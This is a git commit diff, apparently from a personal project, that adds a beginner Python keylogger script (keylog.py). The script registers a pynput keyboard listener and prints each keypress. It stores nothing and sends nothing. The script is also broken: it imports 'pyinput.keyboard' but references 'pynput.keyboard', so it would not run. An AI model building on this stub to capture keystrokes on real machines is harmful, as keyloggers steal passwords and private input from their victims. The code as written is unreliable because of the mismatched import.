1df8e50fb91636b5679f3a5cd856239fb9224938
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-07-26 12:40:51 -0700

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,3 +1,16 @@
 #!/usr/bin/env python3
 
+#need pynput - not preinstalled
+#pip install pynput / pip3 install pynput
 
+import pyinput.keyboard
+
+def process_keypress(key):
+    print(key)    
+
+keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
+#create listener object from pynput and store as var
+#pass to process_keypress function defined above
+
+with keyboard_listener:
+    keyboard_listener.join()
